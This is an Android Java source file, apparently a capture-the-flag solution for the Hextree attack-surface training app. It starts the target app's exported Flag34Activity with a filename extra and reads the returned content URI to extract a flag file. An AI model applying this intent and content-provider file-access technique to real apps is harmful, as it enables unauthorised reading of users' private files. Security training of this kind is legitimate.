package niraj.patali.contentproviderwirhandroidx;
import android.app.Activity;
import android.content.ContentResolver;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

import androidx.annotation.Nullable;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;

public class MainActivity extends Activity {

    private static final int REQUEST_CODE_FLAG34 = 101;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Step 1: Interact with Flag34Activity
        interactWithFlag34Activity("flags/flag34.txt");
    }

    private void interactWithFlag34Activity(String filename) {
        try {
            Intent intent = new Intent();
            intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag34Activity");
            intent.putExtra("filename", filename); // Request flag34.txt file
            startActivityForResult(intent, REQUEST_CODE_FLAG34);
        } catch (Exception e) {
            e.printStackTrace();
            System.err.println("Failed to start Flag34Activity: " + e.getMessage());
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        Log.i("retruned data", data.getData().toString());
        try{
            InputStream inputStream = getContentResolver().openInputStream(data.getData());
                BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
                StringBuilder fileContent = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    fileContent.append(line).append("\n");
                }
                System.out.println("File Content via Stream:\n" + fileContent);
        } catch (Exception e) {
            e.printStackTrace();
            System.err.println("Failed to read input stream: " + e.getMessage());
        }
    }



    private void readFileContent(Uri fileUri) {
        ContentResolver resolver = getContentResolver();

        try (InputStream inputStream = resolver.openInputStream(fileUri);
             BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream))) {

            StringBuilder fileContent = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                fileContent.append(line).append("\n");
            }
            System.out.println("File Content:\n" + fileContent);

        } catch (Exception e) {
            e.printStackTrace();
            System.err.println("Failed to read file: " + e.getMessage());
        }
    }
}
